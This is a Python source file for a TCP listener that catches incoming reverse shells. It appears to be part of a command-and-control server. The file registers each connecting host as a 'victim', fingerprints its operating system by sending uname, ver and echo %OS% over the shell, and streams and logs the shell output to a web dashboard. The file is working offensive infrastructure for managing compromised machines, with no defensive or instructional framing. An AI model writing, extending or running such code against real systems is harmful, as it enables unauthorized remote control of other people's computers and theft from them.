# server/listeners/tcp_listener.py
import socket
import threading
import uuid
import time
from handlers.activity_logger import ActivityLogger

# Initialize activity logger
activity_logger = ActivityLogger()

class TCPListener(threading.Thread):
    def __init__(self, port, victim_manager, port_event_manager, socketio):
        super().__init__()
        self.port = port
        self.victim_mgr = victim_manager
        self.port_event_mgr = port_event_manager
        self.socketio = socketio
        self.server_socket = None
        self.running = False

    def run(self):
        self.running = True
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind(('0.0.0.0', self.port))
        self.server_socket.listen(5)
        print(f"[*] Listening for reverse shells on port {self.port}")

        while self.running:
            try:
                client_sock, addr = self.server_socket.accept()
                client_ip = addr[0]
                print(f"[+] New connection on port {self.port} from {client_ip}")

                # Log port connection event
                event = self.port_event_mgr.add_event(self.port, client_ip)
                self.socketio.emit('port_connection', event)

                # Create a victim entry with unknown OS (temporary)
                victim_id = str(uuid.uuid4())
                victim = self.victim_mgr.register_raw_victim(
                    victim_id, client_ip, self.port, hostname=client_ip
                )
                self.victim_mgr.set_socket(victim_id, client_sock)

                # Start a thread to handle this shell (detection + reading)
                threading.Thread(
                    target=self._handle_shell,
                    args=(client_sock, victim_id),
                    daemon=True
                ).start()

            except Exception as e:
                if self.running:
                    print(f"Error on port {self.port}: {e}")

    def _detect_os(self, sock, victim_id):
        """Send OS detection commands and update victim manager."""
        # Small delay to let the shell settle
        time.sleep(0.5)

        # 1. Try uname -s (Linux, macOS, BSD)
        sock.sendall(b'uname -s\n')
        sock.settimeout(1.5)
        try:
            data = sock.recv(1024).decode('utf-8', errors='replace').strip()
            print(f"[DEBUG] uname response: {repr(data)}")
            if data:
                if 'Linux' in data:
                    os_type = 'linux'
                elif 'Darwin' in data:
                    os_type = 'darwin'
                elif 'FreeBSD' in data or 'OpenBSD' in data or 'NetBSD' in data:
                    os_type = 'bsd'
                else:
                    os_type = 'unknown'
                self.victim_mgr.update_victim_os(victim_id, os_type)
                print(f"[OS Detection] {victim_id[:8]} -> {os_type} (via uname)")
                return
        except socket.timeout:
            print("[DEBUG] uname timeout")
        except Exception as e:
            print(f"[DEBUG] uname error: {e}")

        # 2. Try Windows 'ver' command
        sock.sendall(b'ver\r\n')
        sock.settimeout(1.5)
        try:
            data = sock.recv(1024).decode('utf-8', errors='replace').strip()
            print(f"[DEBUG] ver response: {repr(data)}")
            if 'Microsoft Windows' in data or 'Windows' in data:
                os_type = 'windows'
                self.victim_mgr.update_victim_os(victim_id, os_type)
                print(f"[OS Detection] {victim_id[:8]} -> {os_type} (via ver)")
                return
        except socket.timeout:
            print("[DEBUG] ver timeout")
        except Exception as e:
            print(f"[DEBUG] ver error: {e}")

        # 3. Try Windows environment variable %OS%
        sock.sendall(b'echo %OS%\r\n')
        sock.settimeout(1.5)
        try:
            data = sock.recv(1024).decode('utf-8', errors='replace').strip()
            print(f"[DEBUG] echo %OS% response: {repr(data)}")
            if 'Windows_NT' in data:
                os_type = 'windows'
                self.victim_mgr.update_victim_os(victim_id, os_type)
                print(f"[OS Detection] {victim_id[:8]} -> {os_type} (via %OS%)")
                return
        except socket.timeout:
            print("[DEBUG] echo %OS% timeout")
        except Exception as e:
            print(f"[DEBUG] echo %OS% error: {e}")

        # 4. If all fail, leave as unknown
        print(f"[OS Detection] {victim_id[:8]} -> unknown (detection failed)")

    def _handle_shell(self, sock, victim_id):
        """Detect OS first, then continuously read and emit output."""
        # Detect OS automatically
        self._detect_os(sock, victim_id)

        # Now start reading normal shell output
        buffer = ""
        while self.running:
            try:
                sock.settimeout(0.5)
                try:
                    data = sock.recv(4096).decode('utf-8', errors='replace')
                except socket.timeout:
                    continue
                except (ConnectionResetError, BrokenPipeError):
                    break

                if not data:
                    break

                buffer += data
                while '\n' in buffer:
                    line, buffer = buffer.split('\n', 1)
                    if line.strip():
                        # Emit to dashboard via WebSocket
                        self.socketio.emit('shell_output', {
                            'victim_id': victim_id,
                            'line': line
                        })
                        # Log the output line for persistence
                        activity_logger.log_shell_output(victim_id, line)
            except Exception as e:
                print(f"[ERROR] Shell reader for {victim_id[:8]}: {e}")
                break

        # Cleanup on disconnect
        print(f"[!] Shell {victim_id[:8]} disconnected")
        self.victim_mgr.remove_victim(victim_id)
        sock.close()
        self.socketio.emit('victim_disconnected', {'victim_id': victim_id})

    def stop(self):
        self.running = False
        if self.server_socket:
            self.server_socket.close()